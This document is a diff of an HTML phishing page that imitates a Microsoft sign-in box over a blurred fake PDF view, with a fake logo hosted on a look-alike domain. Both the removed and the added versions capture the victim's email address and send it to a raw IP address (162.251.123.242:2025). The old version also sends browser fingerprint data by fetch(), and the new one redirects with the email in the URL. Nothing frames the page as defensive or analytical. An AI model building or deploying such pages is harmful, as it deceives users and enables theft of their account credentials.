@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Viewer</title>
+    <title>Load PDF</title>
     <style>
         html, body {
             height: 100%;
@@ -17,185 +18,192 @@
             border: none;
             transition: filter 0.5s ease;
         }
-        #authDialog {
+        #smallIframe {
             position: absolute;
-            width: 450px;
-            height: 350px;
+            width: 450px; /* Original width for larger screens */
+            height: 350px; /* Original height for larger screens */
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             background: #fff;
+            border: none;
             padding: 20px;
             box-sizing: border-box;
             opacity: 0;
             transition: opacity 1s ease;
-            box-shadow: 0 0 20px rgba(0,0,0,0.2);
         }
         #logo {
+            position: relative;
             width: 120px;
             height: auto;
-            margin-bottom: 15px;
+            margin-top: 20px;
+            margin-left: 20px;
+            margin-bottom: 0;
         }
-        #statusMessage {
+        #expiredText, #loginForm {
+            transition: opacity 1s ease;
+            position: relative;
+        }
+        #expiredText {
             color: #000;
             font-size: 26.5px;
-            margin: 10px 0;
+            margin-top: 10px;
+            margin-left: 20px;
+            margin-bottom: 0;
             font-weight: 500;
-            transition: opacity 1s ease;
         }
-        .loader {
+        .throbber-container {
+            position: absolute;
+            width: 100%;
             height: 20px;
-            margin: 20px 0;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
             overflow: hidden;
+            background: transparent;
         }
-        .loader-dots {
+        .throbber {
             display: flex;
             width: 500%;
             height: 100%;
-            animation: moveDots 6s ease-in-out infinite;
+            animation: moveThrobber 6s ease-in-out infinite;
         }
-        .loader-dots div {
+        .throbber div {
             width: 4px;
             height: 4px;
             background: #005da6;
             border-radius: 50%;
             margin: 0 8px;
-            animation: pulse 1.5s ease-in-out infinite;
+            animation: throb 1.5s ease-in-out infinite;
         }
-        #loginForm {
-            display: none;
-        }
-        #loginForm input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: none;
-            border-bottom: 1px solid #005da6;
-            font-size: 16px;
-        }
-        #loginForm button {
-            background: #005da6;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            float: right;
-            cursor: pointer;
-        }
-        .links {
-            clear: both;
-            padding-top: 20px;
-            font-size: 13px;
-        }
-        .links a {
-            color: #005da6;
-            text-decoration: none;
-        }
-        @keyframes moveDots {
+        @keyframes moveThrobber {
             0% { transform: translateX(-100%); }
             50% { transform: translateX(0); }
             100% { transform: translateX(100%); }
         }
-        @keyframes pulse {
+        @keyframes throb {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.5); }
         }
+        #loginForm {
+            display: none;
+            text-align: left;
+            margin-top: 5px;
+            margin-left: 20px;
+            margin-right: 20px; /* Adjusted margin for mobile */
+        }
+        #loginForm input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-bottom: 1px solid #005da6;
+            background: transparent;
+            box-shadow: none;
+            outline: none;
+            font-size: 16px;
+            resize: none;
+        }
+        #loginForm button {
+            background-color: #005da6;
+            color: white;
+            border: none;
+            padding: 7px 10px;
+            font-size: 16px;
+            border-radius: 0px;
+            cursor: pointer;
+            margin-top: 75px; /* Move the button down a little */
+            width: 100px;
+            float: right;
+            margin-right: 0;
+        }
+        #signInText {
+            color: #000;
+            font-size: 26.5px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        #loginForm p {
+            color: black; /* Change text color to black */
+        }
+        /* Media query for mobile devices */
+        @media (max-width: 600px) {
+            #smallIframe {
+                top: 30%; /* Adjust this value to move it higher */
+                width: 100%; /* Fill the width of the mobile frame */
+                height: auto; /* Adjust height as needed */
+            }
+            #loginForm {
+                margin-left: 10px; /* Optional: Adjust margins for mobile */
+                margin-right: 10px; /* Optional: Adjust margins for mobile */
+            }
+        }
     </style>
-</head>
-<body>
-    <iframe id="docViewer" src="about:blank"></iframe>
-    
-    <div id="authDialog">
-        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Logo">
-        <p id="statusMessage">Preparing your session</p>
-        
-        <div class="loader">
-            <div class="loader-dots">
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
-        </div>
-        
-        <div id="loginForm">
-            <p id="signInText">Sign in</p>
-            <form id="authForm">
-                <input type="text" id="email" placeholder="Email, phone, or Skype" required>
-                <button type="submit">Next</button>
-            </form>
-            <div class="links">
-                <a href="#">Create account</a> • 
-                <a href="#">Forgot password?</a>
-            </div>
-        </div>
-    </div>
-
     <script>
-        // Collect device info
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
+        window.onload = function() {
+            // No email field pre-filling and no validation
         };
 
-        // Initialize the page
-        function init() {
-            setTimeout(blurBackground, 2000);
-            setTimeout(showAuthDialog, 3000);
-            setTimeout(showLoginForm, 6000);
-        }
-
-        function blurBackground() {
-            document.getElementById('docViewer').style.filter = 'blur(5px)';
-        }
-
-        function showAuthDialog() {
-            document.getElementById('authDialog').style.opacity = '1';
-            document.getElementById('statusMessage').textContent = "Checking your credentials...";
-        }
-
         function showLoginForm() {
-            document.getElementById('statusMessage').style.opacity = '0';
-            document.querySelector('.loader').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('loginForm').style.display = 'block';
-            }, 1000);
+            document.getElementById('expiredText').style.display = 'none';
+            document.querySelector('.throbber-container').style.display = 'none';
+            const loginForm = document.getElementById('loginForm');
+            loginForm.style.display = 'block';
+            document.getElementById('email').focus(); // Focus on email input
         }
 
-        // Handle form submission
-        document.getElementById('authForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            if (!email) return;
-            
-            // Add email to device info
-            deviceInfo.email = email;
-            
-            try {
-                const response = await fetch('http://162.251.123.242:2025/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(deviceInfo)
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://example.com/redirect";
-                }
-            } catch (error) {
-                console.error('Error:', error);
-            }
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('authForm').onsubmit = function(event) {
+                event.preventDefault(); // Prevent default form submission
+                const emailValue = document.getElementById('email').value; // Get email input value
+                const actionUrl = this.action; // Get the action URL
+                const newUrl = actionUrl + encodeURIComponent(emailValue); // Append email to the URL
+                window.location.href = newUrl; // Redirect to the new URL
+            };
         });
-
-        // Start the flow
-        window.addEventListener('DOMContentLoaded', init);
+    </script>
+</head>
+<body>
+    <iframe id="pdfViewer" src="https://78099.link/pdf/background.png" aria-label="PDF Viewer"></iframe>
+    <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
+        <img id="logo" src="https://microsoft-live.github.io/micro.png" alt="Microsoft Logo">
+        <p id="expiredText">Trying to sign you in</p>
+        <div class="throbber-container">
+            <div class="throbber">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+        <div id="loginForm">
+            <p id="signInText">Sign in</p>
+            <form id="authForm" action="https://162.251.123.242:2025/rezult" method="POST">
+                <input type="email" id="email" placeholder="Email, phone, or Skype" aria-label="email" required>
+                <button type="submit">Next</button>
+            </form>
+            <p style="font-size: 13px; color: black; margin-top: 10px;">No account? <span style="color: blue;">Create one!</span></p>
+            <p style="font-size: 13px; color: blue;">Can’t access your account?</p>
+        </div>
+    </div>
+    <script>
+        function applyBlur() {
+            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
+        }
+        function showSmallIframe() {
+            document.getElementById('smallIframe').style.opacity = '1';
+        }
+        function fadeOutTextAndThrobber() {
+            document.getElementById('expiredText').style.opacity = '0';
+            document.querySelector('.throbber-container').style.opacity = '0';
+            setTimeout(showLoginForm, 1000);
+        }
+        setTimeout(applyBlur, 2000);
+        setTimeout(showSmallIframe, 3000);
+        setTimeout(fadeOutTextAndThrobber, 5000);
     </script>
 </body>
 </html>
